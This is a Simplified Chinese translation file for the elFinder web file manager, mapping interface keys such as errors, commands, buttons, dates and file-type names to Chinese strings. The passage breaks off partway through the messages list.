/**
 * 简体中文 translation
 * @author 翻译者 deerchao <deerchao@gmail.com>
 * @author Andy Hu <andyhu7@yahoo.com.hk>
 * @author Max Wen<max.wen@qq.com>
 * @author Kejun Chang <changkejun@hotmail.com>
 * @author LDMING <china-live@live.cn>
 * @author Andy Lee <oraclei@126.com>
 * @author Cololi <i@cololi.moe>
 * @version 2022-03-04
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.zh_CN = {
		translator : '翻译者 deerchao &lt;deerchao@gmail.com&gt;, Andy Hu &lt;andyhu7@yahoo.com.hk&gt;, Max Wen&lt;max.wen@qq.com&gt;, Kejun Chang &lt;changkejun@hotmail.com&gt;, LDMING &lt;china-live@live.cn&gt;, Andy Lee &lt;oraclei@126.com&gt;, Cololi &lt;i@cololi.moe&gt;',
		language   : '简体中文',
		direction  : 'ltr',
		dateFormat : 'Y-m-d H:i', // will show like: 2022-03-04 11:47
		fancyDateFormat : '$1 H:i', // will show like: 今天 11:47
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220304-114755
		messages   : {
			'getShareText' : '分享',
			'Editor ': '代码编辑器',

			/********************************** errors **********************************/
			'error'                : '错误',
			'errUnknown'           : '未知的错误.',
			'errUnknownCmd'        : '未知的命令.',
			'errJqui'              : '无效的 jQuery UI 配置,必须包含 Selectable、draggable 以及 droppable 组件.',
			'errNode'              : 'elFinder 需要能创建 DOM 元素.',
			'errURL'               : '无效的 elFinder 配置! URL 选项未配置.',
			'errAccess'            : '访问被拒绝.',
			'errConnect'           : '不能连接到服务器端.',
			'errAbort'             : '连接中止.',
			'errTimeout'           : '连接超时.',
			'errNotFound'          : '未找到服务器端.',
			'errResponse'          : '无效的服务器端响应.',
			'errConf'              : '无效的服务器端配置.',
			'errJSON'              : 'PHP JSON 模块未安装.',
			'errNoVolumes'         : '无可读的卷.',
			'errCmdParams'         : '无效的命令 "$1".',
			'errDataNotJSON'       : '服务器返回的数据不符合 JSON 格式.',
			'errDataEmpty'         : '服务器返回的数据为空.',
			'errCmdReq'            : '服务器端请求需要命令名称.',
			'errOpen'              : '无法打开 "$1".',
			'errNotFolder'         : '对象不是文件夹.',
			'errNotFile'           : '对象不是文件.',
			'errRead'              : '无法读取 "$1".',
			'errWrite'             : '无法写入 "$1".',
			'errPerm'              : '没有权限.',
			'errLocked'            : '"$1" 已被锁定,不能重命名, 移动或删除.',
			'errExists'            : '文件 "$1" 已经存在.',
			'errInvName'           : '无效的文件名.',
			'errInvDirname'        : '无效的文件夹名.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : '文件夹不存在.',
			'errFileNotFound'      : '文件不存在.',
			'errTrgFolderNotFound' : '未找到目标文件夹 "$1".',
			'errPopup'             : '浏览器拦截了弹出窗口. 请在选项中允许弹出窗口.',
			'errMkdir'             : '不能创建文件夹 "$1".',
			'errMkfile'            : '不能创建文件 "$1".',
			'errRename'            : '不能重命名 "$1".',
			'errCopyFrom'          : '不允许从卷 "$1" 复制.',
			'errCopyTo'            : '不允许向卷 "$1" 复制.',
			'errMkOutLink'         : '无法创建链接到卷根以外的链接.', // from v2.1 added 03.10.2015
			'errUpload'            : '上传出错.',  // old name - errUploadCommon
			'errUploadFile'        : '无法上传 "$1".', // old name - errUpload
			'errUploadNoFiles'     : '未找到要上传的文件.',
			'errUploadTotalSize'   : '数据超过了允许的最大大小.', // old name - errMaxSize
			'errUploadFileSize'    : '文件超过了允许的最大大小.', //  old name - errFileMaxSize
			'errUploadMime'        : '不允许的文件类型.',
			'errUploadTransfer'    : '"$1" 传输错误.',
			'errUploadTemp'        : '无法为上传文件创建临时文件.', // from v2.1 added 26.09.2015
			'errNotReplace'        : ' "$1" 已存在, 不能被替换.', // new
			'errReplace'           : '无法替换 "$1".',
			'errSave'              : '无法保存 "$1".',
			'errCopy'              : '无法复制 "$1".',
			'errMove'              : '无法移动 "$1".',
			'errCopyInItself'      : '不能移动 "$1" 到原有位置.',
			'errRm'                : '无法删除 "$1".',
			'errTrash'             : '无法移到回收站.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : '不能删除源文件.',
			'errExtract'           : '无法从 "$1" 提取文件.',
			'errArchive'           : '无法创建压缩包.',
			'errArcType'           : '不支持的压缩格式.',
			'errNoArchive'         : '文件不是压缩包, 或者不支持该压缩格式.',
			'errCmdNoSupport'      : '服务器端不支持该命令.',
			'errReplByChild'       : '不能用文件夹 “$1” 下的项替换文件夹 “$1” 自身.',
			'errArcSymlinks'       : '出于安全上的考虑，不允许解压包含符号链接的压缩包.', // edited 24.06.2012
			'errArcMaxSize'        : '压缩包文件超过最大允许文件大小范围.',
			'errResize'            : '无法将调整大小到 "$1".',
			'errResizeDegree'      : '无效的旋转角度.',  // added 7.3.2013
			'errResizeRotate'      : '无法旋转图片.',  // added 7.3.2013
			'errResizeSize'        : '无效的图片尺寸.',  // added 7.3.2013
			'errResizeNoChange'    : '图片尺寸未改变.',  // added 7.3.2013
			'errUsupportType'      : '不被支持的文件格式.',
			'errNotUTF8Content'    : '文件 "$1" 不是 UTF-8 格式, 不能编辑.',  // added 9.11.2011
			'errNetMount'          : '无法装载 "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : '不支持该协议.',     // added 17.04.2012
			'errNetMountFailed'    : '装载失败.',         // added 17.04.2012
			'errNetMountHostReq'   : '需要指定主机.', // added 18.04.2012
			'errSessionExpires'    : '您的会话由于长时间未活动已过期.',
			'errCreatingTempDir'   : '无法创建临时目录 "$1"',
			'errFtpDownloadFile'   : '无法从FTP下载文件 "$1" ',
			'errFtpUploadFile'     : '无法将文件 "$1" 上传至FTP',
			'errFtpMkdir'          : '无法在FTP上创建远程目录 "$1"',
			'errArchiveExec'       : '归档文件"$1"时出错.',
			'errExtractExec'       : '解压文件"$1"时出错.',
			'errNetUnMount'        : '无法卸载.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : '未转换至UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : '如果您需要上传目录, 请尝试使用Google Chrome.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : '搜索 "$1" 超时,仅显示部分搜索结果.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : '必需重新授权.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : '最大可选择项目数为 $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : '无法从回收站中恢复，无法识别还原目的地.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : '找不到这个文件的编辑器.', // from v2.1.25 added 23.5.2017
			'errServerError'       : '服务端发生错误.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : '无法清空文件夹 "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : '存在 $1 多个错误.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : '您一次最多可以创建 $1 个文件夹。', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : '创建压缩包',
			'cmdback'      : '后退',
			'cmdcopy'      : '复制',
			'cmdcut'       : '剪切',
			'cmddownload'  : '下载',
			'cmdduplicate' : '创建副本',
			'cmdedit'      : '编辑文件',
			'cmdextract'   : '从压缩包提取文件',
			'cmdforward'   : '前进',
			'cmdgetfile'   : '选择文件',
			'cmdhelp'      : '关于',
			'cmdhome'      : '首页',
			'cmdinfo'      : '查看详情',
			'cmdmkdir'     : '新建文件夹',
			'cmdmkdirin'   : '至新文件夹', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : '新建文件',
			'cmdopen'      : '打开',
			'cmdpaste'     : '粘贴',
			'cmdquicklook' : '预览',
			'cmdreload'    : '刷新',
			'cmdrename'    : '重命名',
			'cmdrm'        : '删除',
			'cmdtrash'     : '至回收站', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : '恢复', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : '查找文件',
			'cmdup'        : '转到上一级文件夹',
			'cmdupload'    : '上传文件',
			'cmdview'      : '查看',
			'cmdresize'    : '调整大小&旋转',
			'cmdsort'      : '排序',
			'cmdnetmount'  : '装载网络卷', // added 18.04.2012
			'cmdnetunmount': '卸载', // from v2.1 added 30.04.2012
			'cmdplaces'    : '添加到收藏夹', // added 28.12.2014
			'cmdchmod'     : '改变模式', // from v2.1 added 20.6.2015
			'cmdopendir'   : '打开文件夹', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : '设置列宽', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': '全屏显示', // from v2.1.15 added 03.08.2016
			'cmdmove'      : '移动', // from v2.1.15 added 21.08.2016
			'cmdempty'     : '清空文件夹', // from v2.1.25 added 22.06.2017
			'cmdundo'      : '撤消', // from v2.1.27 added 31.07.2017
			'cmdredo'      : '重做', // from v2.1.27 added 31.07.2017
			'cmdpreference': '偏好', // from v2.1.27 added 03.08.2017
			'cmdselectall' : '全选', // from v2.1.28 added 15.08.2017
			'cmdselectnone': '全不选', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': '反向选择', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : '在新窗口打开', // from v2.1.38 added 3.4.2018
			'cmdhide'      : '隐藏 (偏好)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : '关闭',
			'btnSave'   : '保存',
			'btnRm'     : '删除',
			'btnApply'  : '应用',
			'btnCancel' : '取消',
			'btnNo'     : '否',
			'btnYes'    : '是',
			'btnMount'  : '装载',  // added 18.04.2012
			'btnApprove': '至 $1 并确认', // from v2.1 added 26.04.2012
			'btnUnmount': '卸载', // from v2.1 added 30.04.2012
			'btnConv'   : '转换', // from v2.1 added 08.04.2014
			'btnCwd'    : '这里',      // from v2.1 added 22.5.2015
			'btnVolume' : '卷',    // from v2.1 added 22.5.2015
			'btnAll'    : '全部',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME类型', // from v2.1 added 22.5.2015
			'btnFileName':'文件名',  // from v2.1 added 22.5.2015
			'btnSaveClose': '保存并关闭', // from v2.1 added 12.6.2015
			'btnBackup' : '备份', // fromv2.1 added 28.11.2015
			'btnRename'    : '重命名',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : '重命名(All)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : '向前 ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : '向后 ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : '另存为', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : '打开文件夹',
			'ntffile'     : '打开文件',
			'ntfreload'   : '刷新文件夹内容',
			'ntfmkdir'    : '创建文件夹',
			'ntfmkfile'   : '创建文件',
			'ntfrm'       : '删除文件',
			'ntfcopy'     : '复制文件',
			'ntfmove'     : '移动文件',
			'ntfprepare'  : '准备复制文件',
			'ntfrename'   : '重命名文件',
			'ntfupload'   : '上传文件',
			'ntfdownload' : '下载文件',
			'ntfsave'     : '保存文件',
			'ntfarchive'  : '创建压缩包',
			'ntfextract'  : '从压缩包提取文件',
			'ntfsearch'   : '搜索文件',
			'ntfresize'   : '正在更改尺寸',
			'ntfsmth'     : '正在忙 >_<',
			'ntfloadimg'  : '正在加载图片',
			'ntfnetmount' : '正在装载网络卷', // added 18.04.2012
			'ntfnetunmount': '卸载网络卷', // from v2.1 added 30.04.2012
			'ntfdim'      : '获取图像尺寸', // added 20.05.2013
			'ntfreaddir'  : '正在读取文件夹信息', // from v2.1 added 01.07.2013
			'ntfurl'      : '正在获取链接地址', // from v2.1 added 11.03.2014
			'ntfchmod'    : '正在改变文件模式', // from v2.1 added 20.6.2015
			'ntfpreupload': '正在验证上传文件名', // from v2.1 added 31.11.2015
			'ntfzipdl'    : '正在创建一个下载文件', // from v2.1.7 added 23.1.2016
			'ntfparents'  : '正在取得路径信息', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': '正在处理上传文件', // from v2.1.17 added 2.11.2016
			'ntftrash'    : '移动到回收站', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : '从回收站恢复', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : '检查目标文件夹', // from v2.1.24 added 3.5.2017
			'ntfundo'     : '撤消上一个全局操作', // from v2.1.27 added 31.07.2017
			'ntfredo'     : '重做上一全局操作', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : '检查内容', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : '回收站', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : '未知',
			'Today'       : '今天',
			'Yesterday'   : '昨天',
			'msJan'       : '一月',
			'msFeb'       : '二月',
			'msMar'       : '三月',
			'msApr'       : '四月',
			'msMay'       : '五月',
			'msJun'       : '六月',
			'msJul'       : '七月',
			'msAug'       : '八月',
			'msSep'       : '九月',
			'msOct'       : '十月',
			'msNov'       : '十一月',
			'msDec'       : '十二月',
			'January'     : '一月',
			'February'    : '二月',
			'March'       : '三月',
			'April'       : '四月',
			'May'         : '五月',
			'June'        : '六月',
			'July'        : '七月',
			'August'      : '八月',
			'September'   : '九月',
			'October'     : '十月',
			'November'    : '十一月',
			'December'    : '十二月',
			'Sunday'      : '星期日',
			'Monday'      : '星期一',
			'Tuesday'     : '星期二',
			'Wednesday'   : '星期三',
			'Thursday'    : '星期四',
			'Friday'      : '星期五',
			'Saturday'    : '星期六',
			'Sun'         : '周日',
			'Mon'         : '周一',
			'Tue'         : '周二',
			'Wed'         : '周三',
			'Thu'         : '周四',
			'Fri'         : '周五',
			'Sat'         : '周六',

			/******************************** sort variants ********************************/
			'sortname'          : '按名称',
			'sortkind'          : '按类型',
			'sortsize'          : '按大小',
			'sortdate'          : '按日期',
			'sortFoldersFirst'  : '文件夹优先',
			'sortperm'          : '按权限排序', // from v2.1.13 added 13.06.2016
			'sortmode'          : '按属性排序',       // from v2.1.13 added 13.06.2016
			'sortowner'         : '按所有者排序',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : '按组排序',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : '同时刷新树状目录',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : '新文件.txt', // added 10.11.2015
			'untitled folder'   : '新文件夹',   // added 10.11.2015
			'Archive'           : '新压缩包',  // from v2.1 added 10.11.2015
			'untitled file'     : '新文件.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: 文件',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '1 美元：2 美元',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : '请确认',
			'confirmRm'       : '确定要删除文件吗?<br/>该操作不可撤销!',
			'confirmRepl'     : '用新的文件替换原有文件?',
			'confirmRest'     : '从回收站替换当前项?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : '文件不是UTF-8格式.<br/>转换为UTF-8吗？<br/>通过在转换后保存,内容变为UTF-8.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : '无法检测到此文件的字符编码.需要暂时转换此文件为UTF-8编码以进行编辑.<br/>请选择此文件的字符编码.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : '文件已被编辑.<br/>如果不保存直接关闭,将丢失编辑内容.', // from v2.1 added 15.7.2015
			'confirmTrash'    : '确定要将该项移动到回收站么?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : '确定要移动该项到 "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : '全部应用',
			'name'            : '名称',
			'size'            : '大小',
			'perms'           : '权限',
			'modify'          : '修改于',
			'kind'            : '类别',
			'read'            : '读取',
			'write'           : '写入',
			'noaccess'        : '无权限',
			'and'             : '和',
			'unknown'         : '未知',
			'selectall'       : '选择所有文件',
			'selectfiles'     : '选择文件',
			'selectffile'     : '选择第一个文件',
			'selectlfile'     : '选择最后一个文件',
			'viewlist'        : '列表视图',
			'viewicons'       : '图标视图',
			'viewSmall'       : '小图标', // from v2.1.39 added 22.5.2018
			'viewMedium'      : '中图标', // from v2.1.39 added 22.5.2018
			'viewLarge'       : '大图标', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : '超大图标', // from v2.1.39 added 22.5.2018
			'places'          : '位置',
			'calc'            : '计算',
			'path'            : '路径',
			'aliasfor'        : '别名',
			'locked'          : '锁定',
			'dim'             : '尺寸',
			'files'           : '文件',
			'folders'         : '文件夹',
			'items'           : '项目',
			'yes'             : '是',
			'no'              : '否',
			'link'            : '链接',
			'searcresult'     : '搜索结果',
			'selected'        : '选中的项目',
			'about'           : '关于',
			'shortcuts'       : '快捷键',
			'help'            : '帮助',
			'webfm'           : '网络文件管理器',
			'ver'             : '版本',
			'protocolver'     : '协议版本',
			'homepage'        : '项目主页',
			'docs'            : '文档',
			'github'          : '复刻我们的github',
			'twitter'         : '关注我们的twitter',
			'facebook'        : '加入我们的facebook',
			'team'            : '团队',
			'chiefdev'        : '首席开发',
			'developer'       : '开发',
			'contributor'     : '贡献',
			'maintainer'      : '维护',
			'translator'      : '翻译',
			'icons'           : '图标',
			'dontforget'      : '别忘了带上你擦汗的毛巾',
			'shortcutsof'     : '快捷键已禁用',
			'dropFiles'       : '把文件拖到这里',
			'or'              : '或者',
			'selectForUpload' : '选择要上传的文件',
			'moveFiles'       : '移动文件',
			'copyFiles'       : '复制文件',
			'restoreFiles'    : '恢复文件', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : '从这里中删除',
			'aspectRatio'     : '保持比例',
			'scale'           : '缩放比例',
			'width'           : '宽',
			'height'          : '高',
			'resize'          : '调整大小',
			'crop'            : '裁切',
			'rotate'          : '旋转',
			'rotate-cw'       : '顺时针旋转90°',
			'rotate-ccw'      : '逆时针旋转90°',
			'degree'          : '°',
			'netMountDialogTitle' : '装载网络目录', // added 18.04.2012
			'protocol'            : '协议', // added 18.04.2012
			'host'                : '主机', // added 18.04.2012
			'port'                : '端口', // added 18.04.2012
			'user'                : '用户', // added 18.04.2012
			'pass'                : '密码', // added 18.04.2012
			'confirmUnmount'      : '确实要卸载 $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': '从浏览器中拖放或粘贴文件', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : '拖放文件，粘贴网址或剪贴板图像', // from v2.1 added 07.04.2014
			'encoding'        : '编码', // from v2.1 added 19.12.2014
			'locale'          : '语言环境',   // from v2.1 added 19.12.2014
			'searchTarget'    : '目标: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : '按输入MIME类型搜索', // from v2.1 added 22.5.2015
			'owner'           : '所有者', // from v2.1 added 20.6.2015
			'group'           : '组', // from v2.1 added 20.6.2015
			'other'           : '其他', // from v2.1 added 20.6.2015
			'execute'         : '执行', // from v2.1 added 20.6.2015
			'perm'            : '许可', // from v2.1 added 20.6.2015
			'mode'            : '属性', // from v2.1 added 20.6.2015
			'emptyFolder'     : '文件夹是空的', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : '文件夹是空的\\A 拖放可追加项目', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : '文件夹是空的\\A 长按可添加项目', // from v2.1.6 added 30.12.2015
			'quality'         : '品质', // from v2.1.6 added 5.1.2016
			'autoSync'        : '自动同步',  // from v2.1.6 added 10.1.2016
			'moveUp'          : '向上移动',  // from v2.1.6 added 18.1.2016
			'getLink'         : '获取URL链接', // from v2.1.7 added 9.2.2016
			'selectedItems'   : '已选择项目 ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : '目录ID', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : '允许离线操作', // from v2.1.10 added 3.25.2016
			'reAuth'          : '重新验证', // from v2.1.10 added 3.25.2016
			'nowLoading'      : '正在加载...', // from v2.1.12 added 4.26.2016
			'openMulti'       : '打开多个文件', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': '您正在尝试打开$1文件.您确定要在浏览器中打开吗?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : '搜索目标中没有匹配结果', // from v2.1.12 added 5.16.2016
			'editingFile'     : '正在编辑文件.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : '已选择 $1 个项目.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : '剪贴板里有 $1 个项目.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : '增量搜索仅来自当前视图.', // from v2.1.13 added 6.30.2016
			'reinstate'       : '恢复', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 完成', // from v2.1.15 added 21.8.2016
			'contextmenu'     : '上下文菜单', // from v2.1.15 added 9.9.2016
			'pageTurning'     : '翻页', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : '根目录', // from v2.1.16 added 16.9.2016
			'reset'           : '重置', // from v2.1.16 added 1.10.2016
			'bgcolor'         : '背景色', // from v2.1.16 added 1.10.2016
			'colorPicker'     : '颜色选择器', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '步长(8px)', // from v2.1.16 added 4.10.2016
			'enabled'         : '启用', // from v2.1.16 added 4.10.2016
			'disabled'        : '关闭', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : '当前视图下没有匹配结果', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : '当前视图中的第一个字母搜索结果为空', // from v2.1.23 added 24.3.2017
			'textLabel'       : '文本标签', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '剩余 $1 分钟', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : '使用所选编码重新打开', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : '使用所选编码保存', // from v2.1.19 added 2.12.2016
			'selectFolder'    : '选择目录', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': '首字母搜索', // from v2.1.23 added 24.3.2017
			'presets'         : '预置', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : '项目太多，不能移动到回收站.', // from v2.1.25 added 9.6.2017
			'TextArea'        : '文本区域', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : '清空文件夹 "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : '文件夹 "$1" 为空.', // from v2.1.25 added 22.6.2017
			'preference'      : '偏好', // from v2.1.26 added 28.6.2017
			'language'        : '语言设置', // from v2.1.26 added 28.6.2017
			'clearBrowserData': '清除保存在此浏览器中的偏好设置', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : '工具栏设置', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... 剩余$1字符',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... 剩余$1行',  // from v2.1.52 added 16.1.2020
			'sum'             : '总数', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : '粗略的文件大小', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : '鼠标悬停在对话框内可编辑区域时自动获得焦点',  // from v2.1.30 added 2.11.2017
			'select'          : '选择', // from v2.1.30 added 23.11.2017
			'selectAction'    : '双击选择的文件时', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : '用上次使用的编辑器打开', // from v2.1.30 added 23.11.2017
			'selectinvert'    : '反向选择', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : '确定要重命名选定项 $1 为 $2 吗?<br/>该操作不能撤消!', // from v2.1.31 added 4.12.2017
			'batchRename'     : '批量重命名', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '增加数量', // from v2.1.31 added 8.12.2017
			'asPrefix'        : '添加前缀', // from v2.1.31 added 8.12.2017
			'asSuffix'        : '添加后缀', // from v2.1.31 added 8.12.2017
			'changeExtention' : '变化范围', // from v2.1.31 added 8.12.2017
			'columnPref'      : '列设置 (列表视图)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : '所有修改将立即反馈到文档.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : '所有修改在卸载本卷之前不会反馈', // from v2.1.33 added 2.3.2018
			'unmountChildren' : '安装在本卷上的以下卷也会卸载.你确定要卸载吗?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : '选择信息', // from v2.1.33 added 7.3.2018
			'hashChecker'     : '显示文件散列值的算法', // from v2.1.33 added 10.3.2018
			'infoItems'       : '信息条目 (选择信息面板)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': '再按退出', // from v2.1.38 added 1.4.2018
			'toolbar'         : '工具条', // from v2.1.38 added 4.4.2018
			'workspace'       : '工作空间', // from v2.1.38 added 4.4.2018
			'dialog'          : '对话框', // from v2.1.38 added 4.4.2018
			'all'             : '全部', // from v2.1.38 added 4.4.2018
			'iconSize'        : '图标尺寸 (图标视图)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : '打开最大化编辑器窗口', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : '由于通过 API 转换功能当前不可用，请到网站上转换.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : '转换后，必须上传条目URL或一个下载的文件,以保存转换后的文件.', //from v2.1.40 added 8.7.2018
			'convertOn'       : '在 $1 站点上转换', // from v2.1.40 added 10.7.2018
			'integrations'    : '集成', // from v2.1.40 added 11.7.2018
			'integrationWith' : '本 elFinder 集成以下外部服务.使用前请检查使用条款、隐私政策等.', // from v2.1.40 added 11.7.2018
			'showHidden'      : '显示已隐藏的条目', // from v2.1.41 added 24.7.2018
			'hideHidden'      : '隐藏已隐藏的条目', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : '显示/隐藏已隐藏的条目', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : '允许"新文件"使用的文件类型', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : '文本文件类型', // from v2.1.41 added 7.8.2018
			'add'             : '添加', // from v2.1.41 added 7.8.2018
			'theme'           : '主题', // from v2.1.43 added 19.10.2018
			'default'         : '缺省', // from v2.1.43 added 19.10.2018
			'description'     : '描述', // from v2.1.43 added 19.10.2018
			'website'         : '网站', // from v2.1.43 added 19.10.2018
			'author'          : '作者', // from v2.1.43 added 19.10.2018
			'email'           : '邮箱', // from v2.1.43 added 19.10.2018
			'license'         : '许可证', // from v2.1.43 added 19.10.2018
			'exportToSave'    : '本条目不能保存. 为避免丢失编辑数据,须要导出到你的电脑.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': '在文件上双击以选中它.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : '使用全屏模式', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : '未知',
			'kindRoot'        : '根目录', // from v2.1.16 added 16.10.2016
			'kindFolder'      : '文件夹',
			'kindSelects'     : '选择', // from v2.1.29 added 29.8.2017
			'kindAlias'       : '别名',
			'kindAliasBroken' : '错误的别名',
			// applications
			'kindApp'         : '程序',
			'kindPostscript'  : 'Postscript 文档',
			'kindMsOffice'    : 'Microsoft Office 文档',
			'kindMsWord'      : 'Microsoft Word 文档',
			'kindMsExcel'     : 'Microsoft Excel 文档',
			'kindMsPP'        : 'Microsoft Powerpoint 演示',
			'kindOO'          : 'Open Office 文档',
			'kindAppFlash'    : 'Flash 程序',
			'kindPDF'         : 'PDF 文档',
			'kindTorrent'     : 'Bittorrent 文件',
			'kind7z'          : '7z 压缩包',
			'kindTAR'         : 'TAR 压缩包',
			'kindGZIP'        : 'GZIP 压缩包',
			'kindBZIP'        : 'BZIP 压缩包',
			'kindXZ'          : 'XZ 压缩包',
			'kindZIP'         : 'ZIP 压缩包',
			'kindRAR'         : 'RAR 压缩包',
			'kindJAR'         : 'Java JAR 文件',
			'kindTTF'         : 'True Type 字体',
			'kindOTF'         : 'Open Type 字体',
			'kindRPM'         : 'RPM 包',
			// texts
			'kindText'        : '文本文件',
			'kindTextPlain'   : '纯文本',
			'kindPHP'         : 'PHP 源代码',
			'kindCSS'         : '层叠样式表(CSS)',
			'kindHTML'        : 'HTML 文档',
			'kindJS'          : 'Javascript 源代码',
			'kindRTF'         : '富文本格式(RTF)',
			'kindC'           : 'C 源代码',
			'kindCHeader'     : 'C 头文件',
			'kindCPP'         : 'C++ 源代码',
			'kindCPPHeader'   : 'C++ 头文件',
			'kindShell'       : 'Unix 外壳脚本',
			'kindPython'      : 'Python 源代码',
			'kindJava'        : 'Java 源代码',
			'kindRuby'        : 'Ruby 源代码',
			'kindPerl'        : 'Perl 源代码',
			'kindSQL'         : 'SQL 脚本',
			'kindXML'         : 'XML 文档',
			'kindAWK'         : 'AWK 源代码',
			'kindCSV'         : '逗号分隔值文件(CSV)',
			'kindDOCBOOK'     : 'Docbook XML 文档',
			'kindMarkdown'    : 'Markdown 文本', // added 20.7.2015
			// images
			'kindImage'       : '图片',
			'kindBMP'         : 'BMP 图片',
			'kindJPEG'        : 'JPEG 图片',
			'kindGIF'         : 'GIF 图片',
			'kindPNG'         : 'PNG 图片',
			'kindTIFF'        : 'TIFF 图片',
			'kindTGA'         : 'TGA 图片',
			'kindPSD'         : 'Adobe Photoshop 图片',
			'kindXBITMAP'     : 'X bitmap 图片',
			'kindPXM'         : 'Pixelmator 图片',
			// media
			'kindAudio'       : '音频',
			'kindAudioMPEG'   : 'MPEG 音频',
			'kindAudioMPEG4'  : 'MPEG-4 音频',
			'kindAudioMIDI'   : 'MIDI 音频',
			'kindAudioOGG'    : 'Ogg Vorbis 音频',
			'kindAudioWAV'    : 'WAV 音频',
			'AudioPlaylist'   : 'MP3 播放列表',
			'kindVideo'       : '视频',
			'kindVideoDV'     : 'DV 视频',
			'kindVideoMPEG'   : 'MPEG 视频',
			'kindVideoMPEG4'  : 'MPEG-4 视频',
			'kindVideoAVI'    : 'AVI 视频',
			'kindVideoMOV'    : 'Quick Time 视频',
